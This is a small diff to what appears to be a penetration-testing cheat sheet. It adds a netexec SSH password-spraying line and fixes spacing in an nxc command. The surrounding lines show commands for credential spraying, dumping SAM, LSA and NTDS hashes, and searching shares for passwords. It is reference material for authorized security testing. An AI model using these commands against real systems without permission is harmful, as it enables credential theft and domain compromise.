@@ -1056,13 +1056,14 @@ $ ./kerbrute_linux_amd64 userenum --dc <DC IP address> --domain <Domain Name> na
 - Netexec
 
 ```
+$ netexec ssh <IP address> -u usernames.txt -p passwords.txt
 $ netexec winrm <IP address> -u usernames.txt -p passwords.txt
 $ netexec smb <IP address> -u <username> -p <password> --shares
 $ netexec smb <IP address> --local-auth -u <username> -p <password> --sam
 $ netexec smb <IP address> --local-auth -u <username> -p <password> --lsa
 $ netexec smb <IP address> -u <username> -p <password> --ntds
 $ netexec smb <IP address> -u <username> -p <password> -M ntdsutil
-$ nxc smb  <IP address> -u <username> -p <password> --spider IT --content --pattern "passw"
+$ nxc smb <IP address> -u <username> -p <password> --spider IT --content --pattern "passw"
 ```
 
 - PCredz
